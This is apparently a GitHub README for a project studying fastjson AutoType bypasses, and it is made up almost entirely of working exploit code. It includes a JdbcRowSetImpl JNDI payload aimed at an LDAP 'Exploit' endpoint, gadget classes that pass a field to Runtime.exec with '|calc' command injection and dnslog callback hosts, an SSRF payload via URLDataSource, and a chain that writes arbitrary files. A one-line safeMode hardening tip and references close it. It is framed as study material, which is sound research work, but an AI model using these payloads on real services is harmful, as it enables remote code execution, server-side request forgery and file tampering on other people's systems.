## What's this

This project is used for studying how to bypass fastJSON AutoType check.

## Gadget Info

**Mapping**

just for fastjson 1.2.47:

```
package com.FastJson1242;

import com.alibaba.fastjson.JSONObject;

public class Poc {
    public static void main(String[] argv){
        String payload ="{\n" +
                "    \"a\": {\n" +
                "        \"@type\": \"java.lang.Class\", \n" +
                "        \"val\": \"com.sun.rowset.JdbcRowSetImpl\"\n" +
                "    }, \n" +
                "    \"b\": {\n" +
                "        \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \n" +
                "        \"dataSourceName\": \"ldap://localhost:1099/Exploit\", \n" +
                "        \"autoCommit\": true\n" +
                "    }\n" +
                "}";
        JSONObject.parseObject(payload);
    }
}
```

**ThrowableDeserializer**

```
package org.heptagram.fastjson;

import java.io.IOException;

public class ViaThrowable extends Exception {
    private String domain;

    public ViaThrowable() {
        super();
    }

    public String getDomain() {
        return domain;
    }

    public void setDomain(String domain) {
        this.domain = domain;
    }

    @Override
    public String getMessage() {
        try {
            Runtime.getRuntime().exec("cmd /c ping "+domain);
        } catch (IOException e) {
            return e.getMessage();
        }
        return super.getMessage();
    }
}
```

exploit:

```
package org.heptagram.fastjson;
import com.alibaba.fastjson.JSONObject;

public class ThrowableMain {
    public static void main(String[] args) {
        String payload ="{\n" +
                "  \"@type\":\"java.lang.Exception\",\n" +
                "  \"@type\": \"org.heptagram.fastjson.ViaThrowable\",\n" +
                "  \"domain\": \"qbknro.dnslog.cn|calc\"\n" +
                "}";
        JSONObject.parseObject(payload);
    }
}
```

**JavaBeanDeserializer**

```
package org.heptagram.fastjson;

import java.io.IOException;
import java.io.Closeable;

public class ViaAutoCloseable  implements Closeable {
    private String domain;

    public ViaAutoCloseable() {
    }

    public ViaAutoCloseable(String domain) {
        this.domain = domain;
    }

    public String getDomain() {
        try {
            Runtime.getRuntime().exec(new String[]{"cmd", "/c", "ping " + domain});
        } catch (IOException e) {
            e.printStackTrace();
        }
        return domain;
    }

    public void setDomain(String domain) {
        this.domain = domain;
    }

    @Override
    public void close() throws IOException {

    }
}
```

exploit:

```
package org.heptagram.fastjson;

import com.alibaba.fastjson.JSONObject;

public class AutoCloseableMain {
    public static void main(String[] args) {
        String payload ="{\n" +
                "  \"@type\":\"java.lang.AutoCloseable\",\n" +
                "  \"@type\": \"org.heptagram.fastjson.ViaAutoCloseable\",\n" +
                "  \"domain\": \" wme8bg.dnslog.cn| calc\"\n" +
                "}";
        JSONObject.parseObject(payload);
    }
}
```

**$ref use extends**

```
package org.heptagram.fastjson;

import javax.activation.DataSource;
import javax.activation.URLDataSource;
import java.net.URL;

public class RefSSRF extends Exception {

    public RefSSRF() {
    }
    private DataSource dataSource;

    public DataSource getDataSource() {
        return dataSource;
    }
    public void setDataSource(URL url) {
        this.dataSource = new URLDataSource(url);
    }
}
```

exploit:

```
package org.heptagram.fastjson;

import com.alibaba.fastjson.JSON;

public class RefSSRFMain {
    public static void main(String[] args) {
        String a ="{\n" +
                "  \"@type\": \"java.lang.Exception\",\n" +
                "  \"@type\": \"org.heptagram.fastjson.RefSSRF\",\n" +
                "  \"dataSource\": {\n" +
                "    \"@type\": \"java.net.URL\",\n" +
                "    \"val\": \"http://127.0.0.1:4444/Exploit\"\n" +
                "  }\n" +
                "}";
        JSON.parseObject(a);
    }
}
```

**File operate**

```
$ echo -ne "RMB122 is here" | openssl zlib | base64 -w 0
eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==

$ echo -ne "RMB122 is here" | openssl zlib | wc -c
22
```

poc:

```
{
    '@type':"java.lang.AutoCloseable",
    '@type':'sun.rmi.server.MarshalOutputStream',
    'out':
    {
        '@type':'java.util.zip.InflaterOutputStream',
        'out':
        {
           '@type':'java.io.FileOutputStream',
           'file':'dst',
           'append':false
        },
        'infl':
        {
            'input':
            {
                'array':'eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==',
                'limit':22
            }
        },
        'bufLen':1048576
    },
    'protocolVersion':1
}
```

FileWrite.java:

```
package org.heptagram.fastjson;

import com.alibaba.fastjson.JSON;
import java.io.IOException;

public class FileWrite {
    public static void main(String[] args) throws IOException {
        String json = "{\n" +
                "  '@type': \"java.lang.AutoCloseable\",\n" +
                "  '@type': 'sun.rmi.server.MarshalOutputStream',\n" +
                "  'out': {\n" +
                "    '@type': 'java.util.zip.InflaterOutputStream',\n" +
                "    'out': {\n" +
                "      '@type': 'java.io.FileOutputStream',\n" +
                "      'file': 'e:/filewrite.txt',\n" +
                "      'append': false\n" +
                "    },\n" +
                "    'infl': {\n" +
                "      'input': {\n" +
                "        'array': 'eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==',\n" +
                "        'limit': 22\n" +
                "      }\n" +
                "    },\n" +
                "    'bufLen': 1048576\n" +
                "  },\n" +
                "  'protocolVersion': 1\n" +
                "}";
        JSON.parse(json);
    }
}
```

## Additional Info

This project is based on Y4er's [project](https://github.com/Y4er/fastjson-bypass-autotype-1.2.68).

The gadgets involved are all from the Internet, which is just a simple learning experience

## Security Advice

open safeMode

```
ParserConfig.getGlobalInstance().setSafeMode(true);
```

## Reference

https://b1ue.cn/archives/348.html

https://b1ue.cn/archives/382.html

https://y4er.com/post/fastjson-bypass-autotype-1268/

[https://www.kingkk.com/2020/06/%E6%B5%85%E8%B0%88%E4%B8%8BFastjson%E7%9A%84autotype%E7%BB%95%E8%BF%87/](https://www.kingkk.com/2020/06/浅谈下Fastjson的autotype绕过/)

https://github.com/threedr3am/learnjavabug/blob/96f81b85bab45453d8c29465225b51f3900148f3/fastjson/src/main/java/com/threedr3am/bug/fastjson/file/FileWriteBypassAutoType1_2_68.java

[https://rmb122.com/2020/06/12/fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-gadgets-%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/](https://rmb122.com/2020/06/12/fastjson-1-2-68-反序列化漏洞-gadgets-挖掘笔记/)

